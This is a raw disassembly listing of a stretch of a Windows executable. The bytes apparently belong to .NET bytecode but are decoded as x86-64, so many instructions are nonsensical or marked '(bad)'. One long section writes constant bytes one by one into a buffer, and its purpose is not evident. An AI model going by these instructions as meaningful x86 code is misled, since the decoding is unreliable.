   1400024a5:	28 50 00             	sub    %dl,0x0(%rax)
   1400024a8:	00 06                	add    %al,(%rsi)
   1400024aa:	26 03 28             	es add (%rax),%ebp
   1400024ad:	d3 00                	roll   %cl,(%rax)
   1400024af:	00 06                	add    %al,(%rsi)
   1400024b1:	0a 02                	or     (%rdx),%al
   1400024b3:	03 06                	add    (%rsi),%eax
   1400024b5:	28 36                	sub    %dh,(%rsi)
   1400024b7:	00 00                	add    %al,(%rax)
   1400024b9:	06                   	(bad)
   1400024ba:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e2bbe
   1400024c0:	00 06                	add    %al,(%rsi)
   1400024c2:	02 28                	add    (%rax),%ch
   1400024c4:	7d 00                	jge    0x1400024c6
   1400024c6:	00 06                	add    %al,(%rsi)
   1400024c8:	dc 02                	faddl  (%rdx)
   1400024ca:	2a 00                	sub    (%rax),%al
   1400024cc:	41 1c 00             	rex.B sbb $0x0,%al
   1400024cf:	00 04 00             	add    %al,(%rax,%rax,1)
   1400024d2:	00 00                	add    %al,(%rax)
   1400024d4:	07                   	(bad)
   1400024d5:	00 00                	add    %al,(%rax)
   1400024d7:	00 11                	add    %dl,(%rcx)
   1400024d9:	00 00                	add    %al,(%rax)
   1400024db:	00 18                	add    %bl,(%rax)
   1400024dd:	00 00                	add    %al,(%rax)
   1400024df:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b0024e5
   1400024e5:	00 00                	add    %al,(%rax)
   1400024e7:	01 03                	add    %eax,(%rbx)
   1400024e9:	30 02                	xor    %al,(%rdx)
   1400024eb:	00 1c 00             	add    %bl,(%rax,%rax,1)
   1400024ee:	00 00                	add    %al,(%rax)
   1400024f0:	12 00                	adc    (%rax),%al
   1400024f2:	00 11                	add    %dl,(%rcx)
   1400024f4:	03 1f                	add    (%rdi),%ebx
   1400024f6:	20 6a 58             	and    %ch,0x58(%rdx)
   1400024f9:	16                   	(bad)
   1400024fa:	28 6e 00             	sub    %ch,0x0(%rsi)
   1400024fd:	00 06                	add    %al,(%rsi)
   1400024ff:	26 1f                	es (bad)
   140002501:	58                   	pop    %rax
   140002502:	6a 0b                	push   $0xb
   140002504:	03 0a                	add    (%rdx),%ecx
   140002506:	03 1f                	add    (%rdi),%ebx
   140002508:	58                   	pop    %rax
   140002509:	6a 28                	push   $0x28
   14000250b:	da 00                	fiaddl (%rax)
   14000250d:	00 06                	add    %al,(%rsi)
   14000250f:	2a 0b                	sub    (%rbx),%cl
   140002511:	30 02                	xor    %al,(%rdx)
   140002513:	00 67 00             	add    %ah,0x0(%rdi)
   140002516:	00 00                	add    %al,(%rax)
   140002518:	22 00                	and    (%rax),%al
   14000251a:	00 11                	add    %dl,(%rcx)
   14000251c:	02 1e                	add    (%rsi),%bl
   14000251e:	6a 58                	push   $0x58
   140002520:	4c 2c 5f             	rex.WR sub $0x5f,%al
   140002523:	02 1f                	add    (%rdi),%bl
   140002525:	20 6a 58             	and    %ch,0x58(%rdx)
   140002528:	4c 0c 02             	rex.WR or $0x2,%al
   14000252b:	1f                   	(bad)
   14000252c:	18 6a 58             	sbb    %ch,0x58(%rdx)
   14000252f:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140002532:	08 2e                	or     %ch,(%rsi)
   140002534:	23 06                	and    (%rsi),%eax
   140002536:	13 04 06             	adc    (%rsi,%rax,1),%eax
   140002539:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   14000253c:	00 06                	add    %al,(%rsi)
   14000253e:	de 0e                	fimuls (%rsi)
   140002540:	fe 06                	incb   (%rsi)
   140002542:	2e 00 00             	cs add %al,(%rax)
   140002545:	06                   	(bad)
   140002546:	11 04 28             	adc    %eax,(%rax,%rbp,1)
   140002549:	7d 00                	jge    0x14000254b
   14000254b:	00 06                	add    %al,(%rsi)
   14000254d:	dc 06                	faddl  (%rsi)
   14000254f:	1f                   	(bad)
   140002550:	40 6a 58             	rex push $0x58
   140002553:	0a 06                	or     (%rsi),%al
   140002555:	08 33                	or     %dh,(%rbx)
   140002557:	dd 02                	fldl   (%rdx)
   140002559:	1f                   	(bad)
   14000255a:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000255d:	4c 1f                	rex.WR (bad)
   14000255f:	40 6a 5a             	rex push $0x5a
   140002562:	0b 02                	or     (%rdx),%eax
   140002564:	1e                   	(bad)
   140002565:	6a 58                	push   $0x58
   140002567:	4c 0d 07 20 00 10    	rex.WR or $0x10002007,%rax
   14000256d:	00 00                	add    %al,(%rax)
   14000256f:	6a 37                	push   $0x37
   140002571:	09 12                	or     %edx,(%rdx)
   140002573:	03 12                	add    (%rdx),%edx
   140002575:	01 28                	add    %ebp,(%rax)
   140002577:	0a 00                	or     (%rax),%al
   140002579:	00 06                	add    %al,(%rsi)
   14000257b:	09 07                	or     %eax,(%rdi)
   14000257d:	28 da                	sub    %bl,%dl
   14000257f:	00 00                	add    %al,(%rax)
   140002581:	06                   	(bad)
   140002582:	2a 00                	sub    (%rax),%al
   140002584:	41 1c 00             	rex.B sbb $0x0,%al
   140002587:	00 04 00             	add    %al,(%rax,%rax,1)
   14000258a:	00 00                	add    %al,(%rax)
   14000258c:	1c 00                	sbb    $0x0,%al
   14000258e:	00 00                	add    %al,(%rax)
   140002590:	08 00                	or     %al,(%rax)
   140002592:	00 00                	add    %al,(%rax)
   140002594:	24 00                	and    $0x0,%al
   140002596:	00 00                	add    %al,(%rax)
   140002598:	0e                   	(bad)
   140002599:	00 00                	add    %al,(%rax)
   14000259b:	00 3b                	add    %bh,(%rbx)
   14000259d:	00 00                	add    %al,(%rax)
   14000259f:	01 0b                	add    %ecx,(%rbx)
   1400025a1:	30 03                	xor    %al,(%rbx)
   1400025a3:	00 84 00 00 00 23 00 	add    %al,0x230000(%rax,%rax,1)
   1400025aa:	00 11                	add    %dl,(%rcx)
   1400025ac:	02 4c 13 04          	add    0x4(%rbx,%rdx,1),%cl
   1400025b0:	11 04 2c             	adc    %eax,(%rsp,%rbp,1)
   1400025b3:	5f                   	pop    %rdi
   1400025b4:	02 1e                	add    (%rsi),%bl
   1400025b6:	6a 58                	push   $0x58
   1400025b8:	4c 0d 11 04 0a 06    	rex.WR or $0x60a0411,%rax
   1400025be:	09 2e                	or     %ebp,(%rsi)
   1400025c0:	23 06                	and    (%rsi),%eax
   1400025c2:	13 06                	adc    (%rsi),%eax
   1400025c4:	06                   	(bad)
   1400025c5:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   1400025c8:	00 06                	add    %al,(%rsi)
   1400025ca:	de 0e                	fimuls (%rsi)
   1400025cc:	fe 06                	incb   (%rsi)
   1400025ce:	2e 00 00             	cs add %al,(%rax)
   1400025d1:	06                   	(bad)
   1400025d2:	11 06                	adc    %eax,(%rsi)
   1400025d4:	28 7d 00             	sub    %bh,0x0(%rbp)
   1400025d7:	00 06                	add    %al,(%rsi)
   1400025d9:	dc 06                	faddl  (%rsi)
   1400025db:	1f                   	(bad)
   1400025dc:	40 6a 58             	rex push $0x58
   1400025df:	0a 06                	or     (%rsi),%al
   1400025e1:	09 33                	or     %esi,(%rbx)
   1400025e3:	dd 02                	fldl   (%rdx)
   1400025e5:	4c 0c 02             	rex.WR or $0x2,%al
   1400025e8:	1f                   	(bad)
   1400025e9:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400025ec:	4c 08 59 1c          	rex.WR or %r11b,0x1c(%rcx)
   1400025f0:	63 1f                	movsxd (%rdi),%ebx
   1400025f2:	40 6a 5a             	rex push $0x5a
   1400025f5:	0b 08                	or     (%rax),%ecx
   1400025f7:	13 05 07 20 00 10    	adc    0x10002007(%rip),%eax        # 0x150004604
   1400025fd:	00 00                	add    %al,(%rax)
   1400025ff:	6a 37                	push   $0x37
   140002601:	09 12                	or     %edx,(%rdx)
   140002603:	05 12 01 28 0a       	add    $0xa280112,%eax
   140002608:	00 00                	add    %al,(%rax)
   14000260a:	06                   	(bad)
   14000260b:	11 05 07 28 da 00    	adc    %eax,0xda2807(%rip)        # 0x140da4e18
   140002611:	00 06                	add    %al,(%rsi)
   140002613:	02 03                	add    (%rbx),%al
   140002615:	55                   	push   %rbp
   140002616:	02 1e                	add    (%rsi),%bl
   140002618:	6a 58                	push   $0x58
   14000261a:	04 1f                	add    $0x1f,%al
   14000261c:	40 6a 5a             	rex push $0x5a
   14000261f:	03 58 55             	add    0x55(%rax),%ebx
   140002622:	02 1f                	add    (%rdi),%bl
   140002624:	10 6a 58             	adc    %ch,0x58(%rdx)
   140002627:	05 1f 40 6a 5a       	add    $0x5a6a401f,%eax
   14000262c:	03 58 55             	add    0x55(%rax),%ebx
   14000262f:	2a 41 1c             	sub    0x1c(%rcx),%al
   140002632:	00 00                	add    %al,(%rax)
   140002634:	04 00                	add    $0x0,%al
   140002636:	00 00                	add    %al,(%rax)
   140002638:	18 00                	sbb    %al,(%rax)
   14000263a:	00 00                	add    %al,(%rax)
   14000263c:	08 00                	or     %al,(%rax)
   14000263e:	00 00                	add    %al,(%rax)
   140002640:	20 00                	and    %al,(%rax)
   140002642:	00 00                	add    %al,(%rax)
   140002644:	0e                   	(bad)
   140002645:	00 00                	add    %al,(%rax)
   140002647:	00 3b                	add    %bh,(%rbx)
   140002649:	00 00                	add    %al,(%rax)
   14000264b:	01 0b                	add    %ecx,(%rbx)
   14000264d:	30 02                	xor    %al,(%rdx)
   14000264f:	00 2f                	add    %ch,(%rdi)
   140002651:	00 00                	add    %al,(%rax)
   140002653:	00 24 00             	add    %ah,(%rax,%rax,1)
   140002656:	00 11                	add    %dl,(%rcx)
   140002658:	02 1e                	add    (%rsi),%bl
   14000265a:	6a 58                	push   $0x58
   14000265c:	4c 0b 02             	or     (%rdx),%r8
   14000265f:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140002662:	07                   	(bad)
   140002663:	2e 21 06             	cs and %eax,(%rsi)
   140002666:	0c 06                	or     $0x6,%al
   140002668:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   14000266b:	00 06                	add    %al,(%rsi)
   14000266d:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e2d71
   140002673:	00 06                	add    %al,(%rsi)
   140002675:	08 28                	or     %ch,(%rax)
   140002677:	7d 00                	jge    0x140002679
   140002679:	00 06                	add    %al,(%rsi)
   14000267b:	dc 06                	faddl  (%rsi)
   14000267d:	1f                   	(bad)
   14000267e:	40 6a 58             	rex push $0x58
   140002681:	0a 06                	or     (%rsi),%al
   140002683:	07                   	(bad)
   140002684:	33 df                	xor    %edi,%ebx
   140002686:	2a 00                	sub    (%rax),%al
   140002688:	41 1c 00             	rex.B sbb $0x0,%al
   14000268b:	00 04 00             	add    %al,(%rax,%rax,1)
   14000268e:	00 00                	add    %al,(%rax)
   140002690:	0f 00 00             	sldt   (%rax)
   140002693:	00 08                	add    %cl,(%rax)
   140002695:	00 00                	add    %al,(%rax)
   140002697:	00 17                	add    %dl,(%rdi)
   140002699:	00 00                	add    %al,(%rax)
   14000269b:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b0026a1
   1400026a1:	00 00                	add    %al,(%rax)
   1400026a3:	01 0b                	add    %ecx,(%rbx)
   1400026a5:	30 03                	xor    %al,(%rbx)
   1400026a7:	00 6c 28 00          	add    %ch,0x0(%rax,%rbp,1)
   1400026ab:	00 25 00 00 11 16    	add    %ah,0x16110000(%rip)        # 0x1561126b1
   1400026b1:	0a 12                	or     (%rdx),%dl
   1400026b3:	04 20                	add    $0x20,%al
   1400026b5:	e8 00 00 00 52       	call   0x1920026ba
   1400026ba:	12 04 17             	adc    (%rdi,%rdx,1),%al
   1400026bd:	58                   	pop    %rax
   1400026be:	1f                   	(bad)
   1400026bf:	1c 52                	sbb    $0x52,%al
   1400026c1:	12 04 18             	adc    (%rax,%rbx,1),%al
   1400026c4:	58                   	pop    %rax
   1400026c5:	19 52 12             	sbb    %edx,0x12(%rdx)
   1400026c8:	04 19                	add    $0x19,%al
   1400026ca:	58                   	pop    %rax
   1400026cb:	16                   	(bad)
   1400026cc:	52                   	push   %rdx
   1400026cd:	12 04 1a             	adc    (%rdx,%rbx,1),%al
   1400026d0:	58                   	pop    %rax
   1400026d1:	16                   	(bad)
   1400026d2:	52                   	push   %rdx
   1400026d3:	12 04 1b             	adc    (%rbx,%rbx,1),%al
   1400026d6:	58                   	pop    %rax
   1400026d7:	1f                   	(bad)
   1400026d8:	4d 52                	rex.WRB push %r10
   1400026da:	12 04 1c             	adc    (%rsp,%rbx,1),%al
   1400026dd:	58                   	pop    %rax
   1400026de:	1f                   	(bad)
   1400026df:	0f 52 12             	rsqrtps (%rdx),%xmm2
   1400026e2:	04 1d                	add    $0x1d,%al
   1400026e4:	58                   	pop    %rax
   1400026e5:	1f                   	(bad)
   1400026e6:	4f 52                	rex.WRXB push %r10
   1400026e8:	12 04 1e             	adc    (%rsi,%rbx,1),%al
   1400026eb:	58                   	pop    %rax
   1400026ec:	20 ed                	and    %ch,%ch
   1400026ee:	00 00                	add    %al,(%rax)
   1400026f0:	00 52 12             	add    %dl,0x12(%rdx)
   1400026f3:	04 1f                	add    $0x1f,%al
   1400026f5:	09 58 20             	or     %ebx,0x20(%rax)
   1400026f8:	bf 00 00 00 52       	mov    $0x52000000,%edi
   1400026fd:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002700:	0a 58 1f             	or     0x1f(%rax),%bl
   140002703:	49 52                	rex.WB push %r10
   140002705:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002708:	0b 58 20             	or     0x20(%rax),%ebx
   14000270b:	aa                   	stos   %al,(%rdi)
   14000270c:	00 00                	add    %al,(%rax)
   14000270e:	00 52 12             	add    %dl,0x12(%rdx)
   140002711:	04 1f                	add    $0x1f,%al
   140002713:	0c 58                	or     $0x58,%al
   140002715:	20 b7 00 00 00 52    	and    %dh,0x52000000(%rdi)
   14000271b:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000271e:	0d 58 1f 38 52       	or     $0x52381f58,%eax
   140002723:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002726:	0e                   	(bad)
   140002727:	58                   	pop    %rax
   140002728:	1f                   	(bad)
   140002729:	3e 52                	ds push %rdx
   14000272b:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000272e:	0f 58 18             	addps  (%rax),%xmm3
   140002731:	52                   	push   %rdx
   140002732:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002735:	10 58 20             	adc    %bl,0x20(%rax)
   140002738:	fd                   	std
   140002739:	00 00                	add    %al,(%rax)
   14000273b:	00 52 12             	add    %dl,0x12(%rdx)
   14000273e:	04 1f                	add    $0x1f,%al
   140002740:	11 58 20             	adc    %ebx,0x20(%rax)
   140002743:	cd 00                	int    $0x0
   140002745:	00 00                	add    %al,(%rax)
   140002747:	52                   	push   %rdx
   140002748:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000274b:	12 58 20             	adc    0x20(%rax),%bl
   14000274e:	9a                   	(bad)
   14000274f:	00 00                	add    %al,(%rax)
   140002751:	00 52 12             	add    %dl,0x12(%rdx)
   140002754:	04 1f                	add    $0x1f,%al
   140002756:	13 58 1f             	adc    0x1f(%rax),%ebx
   140002759:	30 52 12             	xor    %dl,0x12(%rdx)
   14000275c:	04 1f                	add    $0x1f,%al
   14000275e:	14 58                	adc    $0x58,%al
   140002760:	20 ac 00 00 00 52 12 	and    %ch,0x12520000(%rax,%rax,1)
   140002767:	04 1f                	add    $0x1f,%al
   140002769:	15 58 1f 1f 52       	adc    $0x521f1f58,%eax
   14000276e:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002771:	16                   	(bad)
   140002772:	58                   	pop    %rax
   140002773:	20 86 00 00 00 52    	and    %al,0x52000000(%rsi)
   140002779:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000277c:	17                   	(bad)
   14000277d:	58                   	pop    %rax
   14000277e:	20 d8                	and    %bl,%al
   140002780:	00 00                	add    %al,(%rax)
   140002782:	00 52 12             	add    %dl,0x12(%rdx)
   140002785:	04 1f                	add    $0x1f,%al
   140002787:	18 58 1f             	sbb    %bl,0x1f(%rax)
   14000278a:	13 52 12             	adc    0x12(%rdx),%edx
   14000278d:	04 1f                	add    $0x1f,%al
   14000278f:	19 58 16             	sbb    %ebx,0x16(%rax)
   140002792:	52                   	push   %rdx
   140002793:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002796:	1a 58 1f             	sbb    0x1f(%rax),%bl
   140002799:	41 52                	push   %r10
   14000279b:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000279e:	1b 58 1f             	sbb    0x1f(%rax),%ebx
   1400027a1:	30 52 12             	xor    %dl,0x12(%rdx)
   1400027a4:	04 1f                	add    $0x1f,%al
   1400027a6:	1c 58                	sbb    $0x58,%al
   1400027a8:	1f                   	(bad)
   1400027a9:	34 52                	xor    $0x52,%al
   1400027ab:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027ae:	1d 58 1f 0c 52       	sbb    $0x520c1f58,%eax
   1400027b3:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027b6:	1e                   	(bad)
   1400027b7:	58                   	pop    %rax
   1400027b8:	1f                   	(bad)
   1400027b9:	41 52                	push   %r10
   1400027bb:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027be:	1f                   	(bad)
   1400027bf:	58                   	pop    %rax
   1400027c0:	18 52 12             	sbb    %dl,0x12(%rdx)
   1400027c3:	04 1f                	add    $0x1f,%al
   1400027c5:	20 58 1f             	and    %bl,0x1f(%rax)
   1400027c8:	34 52                	xor    $0x52,%al
   1400027ca:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027cd:	21 58 1f             	and    %ebx,0x1f(%rax)
   1400027d0:	0c 52                	or     $0x52,%al
   1400027d2:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027d5:	22 58 20             	and    0x20(%rax),%bl
   1400027d8:	e2 00                	loop   0x1400027da
   1400027da:	00 00                	add    %al,(%rax)
   1400027dc:	52                   	push   %rdx
   1400027dd:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027e0:	23 58 20             	and    0x20(%rax),%ebx
   1400027e3:	f6 00 00             	testb  $0x0,(%rax)
   1400027e6:	00 52 12             	add    %dl,0x12(%rdx)
   1400027e9:	04 1f                	add    $0x1f,%al
   1400027eb:	24 58                	and    $0x58,%al
   1400027ed:	20 cd                	and    %cl,%ch
   1400027ef:	00 00                	add    %al,(%rax)
   1400027f1:	00 52 12             	add    %dl,0x12(%rdx)
   1400027f4:	04 1f                	add    $0x1f,%al
   1400027f6:	25 58 1f 24 52       	and    $0x52241f58,%eax
   1400027fb:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400027fe:	26 58                	es pop %rax
   140002800:	20 91 00 00 00 52    	and    %dl,0x52000000(%rcx)
   140002806:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002809:	27                   	(bad)
   14000280a:	58                   	pop    %rax
   14000280b:	20 a1 00 00 00 52    	and    %ah,0x52000000(%rcx)
   140002811:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002814:	28 58 1f             	sub    %bl,0x1f(%rax)
   140002817:	1c 52                	sbb    $0x52,%al
   140002819:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000281c:	29 58 1f             	sub    %ebx,0x1f(%rax)
   14000281f:	7a 52                	jp     0x140002873
   140002821:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002824:	2a 58 20             	sub    0x20(%rax),%bl
   140002827:	8d 00                	lea    (%rax),%eax
   140002829:	00 00                	add    %al,(%rax)
   14000282b:	52                   	push   %rdx
   14000282c:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000282f:	2b 58 1f             	sub    0x1f(%rax),%ebx
   140002832:	41 52                	push   %r10
   140002834:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002837:	2c 58                	sub    $0x58,%al
   140002839:	20 a4 00 00 00 52 12 	and    %ah,0x12520000(%rax,%rax,1)
   140002840:	04 1f                	add    $0x1f,%al
   140002842:	2d 58 1f 73 52       	sub    $0x52731f58,%eax
   140002847:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000284a:	2e 58                	cs pop %rax
   14000284c:	20 86 00 00 00 52    	and    %al,0x52000000(%rsi)
   140002852:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002855:	2f                   	(bad)
   140002856:	58                   	pop    %rax
   140002857:	1f                   	(bad)
   140002858:	29 52 12             	sub    %edx,0x12(%rdx)
   14000285b:	04 1f                	add    $0x1f,%al
   14000285d:	30 58 1f             	xor    %bl,0x1f(%rax)
   140002860:	76 52                	jbe    0x1400028b4
   140002862:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002865:	31 58 1f             	xor    %ebx,0x1f(%rax)
   140002868:	34 52                	xor    $0x52,%al
   14000286a:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000286d:	32 58 1f             	xor    0x1f(%rax),%bl
   140002870:	2d 52 12 04 1f       	sub    $0x1f041252,%eax
   140002875:	33 58 20             	xor    0x20(%rax),%ebx
   140002878:	8d 00                	lea    (%rax),%eax
   14000287a:	00 00                	add    %al,(%rax)
   14000287c:	52                   	push   %rdx
   14000287d:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002880:	34 58                	xor    $0x58,%al
   140002882:	20 db                	and    %bl,%bl
   140002884:	00 00                	add    %al,(%rax)
   140002886:	00 52 12             	add    %dl,0x12(%rdx)
   140002889:	04 1f                	add    $0x1f,%al
   14000288b:	35 58 1f 4c 52       	xor    $0x524c1f58,%eax
   140002890:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002893:	36 58                	ss pop %rax
   140002895:	1f                   	(bad)
   140002896:	0d 52 12 04 1f       	or     $0x1f041252,%eax
   14000289b:	37                   	(bad)
   14000289c:	58                   	pop    %rax
   14000289d:	1f                   	(bad)
   14000289e:	58                   	pop    %rax
   14000289f:	52                   	push   %rdx
   1400028a0:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028a3:	38 58 20             	cmp    %bl,0x20(%rax)
   1400028a6:	fd                   	std
   1400028a7:	00 00                	add    %al,(%rax)
   1400028a9:	00 52 12             	add    %dl,0x12(%rdx)
   1400028ac:	04 1f                	add    $0x1f,%al
   1400028ae:	39 58 1f             	cmp    %ebx,0x1f(%rax)
   1400028b1:	0e                   	(bad)
   1400028b2:	52                   	push   %rdx
   1400028b3:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028b6:	3a 58 1f             	cmp    0x1f(%rax),%bl
   1400028b9:	4c 52                	rex.WR push %rdx
   1400028bb:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028be:	3b 58 20             	cmp    0x20(%rax),%ebx
   1400028c1:	c6 00 00             	movb   $0x0,(%rax)
   1400028c4:	00 52 12             	add    %dl,0x12(%rdx)
   1400028c7:	04 1f                	add    $0x1f,%al
   1400028c9:	3c 58                	cmp    $0x58,%al
   1400028cb:	20 a0 00 00 00 52    	and    %ah,0x52000000(%rax)
   1400028d1:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028d4:	3d 58 20 8e 00       	cmp    $0x8e2058,%eax
   1400028d9:	00 00                	add    %al,(%rax)
   1400028db:	52                   	push   %rdx
   1400028dc:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028df:	3e 58                	ds pop %rax
   1400028e1:	1f                   	(bad)
   1400028e2:	09 52 12             	or     %edx,0x12(%rdx)
   1400028e5:	04 1f                	add    $0x1f,%al
   1400028e7:	3f                   	(bad)
   1400028e8:	58                   	pop    %rax
   1400028e9:	20 bd 00 00 00 52    	and    %bh,0x52000000(%rbp)
   1400028ef:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400028f2:	40 58                	rex pop %rax
   1400028f4:	20 bc 00 00 00 52 12 	and    %bh,0x12520000(%rax,%rax,1)
   1400028fb:	04 1f                	add    $0x1f,%al
   1400028fd:	41 58                	pop    %r8
   1400028ff:	1f                   	(bad)
   140002900:	7b 52                	jnp    0x140002954
   140002902:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002905:	42 58                	rex.X pop %rax
   140002907:	20 cb                	and    %cl,%bl
   140002909:	00 00                	add    %al,(%rax)
   14000290b:	00 52 12             	add    %dl,0x12(%rdx)
   14000290e:	04 1f                	add    $0x1f,%al
   140002910:	43 58                	rex.XB pop %r8
   140002912:	20 a8 00 00 00 52    	and    %ch,0x52000000(%rax)
   140002918:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000291b:	44 58                	rex.R pop %rax
   14000291d:	1f                   	(bad)
   14000291e:	6e                   	outsb  (%rsi),(%dx)
   14000291f:	52                   	push   %rdx
   140002920:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002923:	45 58                	rex.RB pop %r8
   140002925:	1c 52                	sbb    $0x52,%al
   140002927:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000292a:	46 58                	rex.RX pop %rax
   14000292c:	1f                   	(bad)
   14000292d:	77 52                	ja     0x140002981
   14000292f:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002932:	47 58                	rex.RXB pop %r8
   140002934:	20 b4 00 00 00 52 12 	and    %dh,0x12520000(%rax,%rax,1)
   14000293b:	04 1f                	add    $0x1f,%al
   14000293d:	48 58                	rex.W pop %rax
   14000293f:	1f                   	(bad)
   140002940:	1a 52 12             	sbb    0x12(%rdx),%dl
   140002943:	04 1f                	add    $0x1f,%al
   140002945:	49 58                	rex.WB pop %r8
   140002947:	1f                   	(bad)
   140002948:	18 52 12             	sbb    %dl,0x12(%rdx)
   14000294b:	04 1f                	add    $0x1f,%al
   14000294d:	4a 58                	rex.WX pop %rax
   14000294f:	1f                   	(bad)
   140002950:	62 52 12 04 1f       	(bad)
   140002955:	4b 58                	rex.WXB pop %r8
   140002957:	1f                   	(bad)
   140002958:	65 52                	gs push %rdx
   14000295a:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000295d:	4c 58                	rex.WR pop %rax
   14000295f:	20 99 00 00 00 52    	and    %bl,0x52000000(%rcx)
   140002965:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002968:	4d 58                	rex.WRB pop %r8
   14000296a:	1f                   	(bad)
   14000296b:	57                   	push   %rdi
   14000296c:	52                   	push   %rdx
   14000296d:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002970:	4e 58                	rex.WRX pop %rax
   140002972:	1f                   	(bad)
   140002973:	4c 52                	rex.WR push %rdx
   140002975:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002978:	4f 58                	rex.WRXB pop %r8
   14000297a:	20 a5 00 00 00 52    	and    %ah,0x52000000(%rbp)
   140002980:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002983:	50                   	push   %rax
   140002984:	58                   	pop    %rax
   140002985:	20 8f 00 00 00 52    	and    %cl,0x52000000(%rdi)
   14000298b:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000298e:	51                   	push   %rcx
   14000298f:	58                   	pop    %rax
   140002990:	20 98 00 00 00 52    	and    %bl,0x52000000(%rax)
   140002996:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140002999:	52                   	push   %rdx
   14000299a:	58                   	pop    %rax
   14000299b:	20 80 00 00 00 52    	and    %al,0x52000000(%rax)
   1400029a1:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029a4:	53                   	push   %rbx
   1400029a5:	58                   	pop    %rax
   1400029a6:	1f                   	(bad)
   1400029a7:	7f 52                	jg     0x1400029fb
   1400029a9:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029ac:	54                   	push   %rsp
   1400029ad:	58                   	pop    %rax
   1400029ae:	1f                   	(bad)
   1400029af:	5e                   	pop    %rsi
   1400029b0:	52                   	push   %rdx
   1400029b1:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029b4:	55                   	push   %rbp
   1400029b5:	58                   	pop    %rax
   1400029b6:	1f                   	(bad)
   1400029b7:	36 52                	ss push %rdx
   1400029b9:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029bc:	56                   	push   %rsi
   1400029bd:	58                   	pop    %rax
   1400029be:	1f                   	(bad)
   1400029bf:	1c 52                	sbb    $0x52,%al
   1400029c1:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400029c4:	57                   	push   %rdi
   1400029c5:	58                   	pop    %rax
   1400029c6:	1f                   	(bad)
   1400029c7:	1b 52 12             	sbb    0x12(%rdx),%edx
   1400029ca:	04 1f                	add    $0x1f,%al
   1400029cc:	58                   	pop    %rax
   1400029cd:	58                   	pop    %rax
   1400029ce:	1f                   	(bad)
   1400029cf:	1a 52 12             	sbb    0x12(%rdx),%dl
   1400029d2:	04 1f                	add    $0x1f,%al
   1400029d4:	59                   	pop    %rcx
   1400029d5:	58                   	pop    %rax
   1400029d6:	20 d5                	and    %dl,%ch
   1400029d8:	00 00                	add    %al,(%rax)
   1400029da:	00 52 12             	add    %dl,0x12(%rdx)
   1400029dd:	04 1f                	add    $0x1f,%al
   1400029df:	5a                   	pop    %rdx
   1400029e0:	58                   	pop    %rax
   1400029e1:	20 cd                	and    %cl,%ch
   1400029e3:	00 00                	add    %al,(%rax)
   1400029e5:	00 52 12             	add    %dl,0x12(%rdx)
   1400029e8:	04 1f                	add    $0x1f,%al
   1400029ea:	5b                   	pop    %rbx
   1400029eb:	58                   	pop    %rax
   1400029ec:	1f                   	(bad)
   1400029ed:	29 52 12             	sub    %edx,0x12(%rdx)
   1400029f0:	04 1f                	add    $0x1f,%al
   1400029f2:	5c                   	pop    %rsp
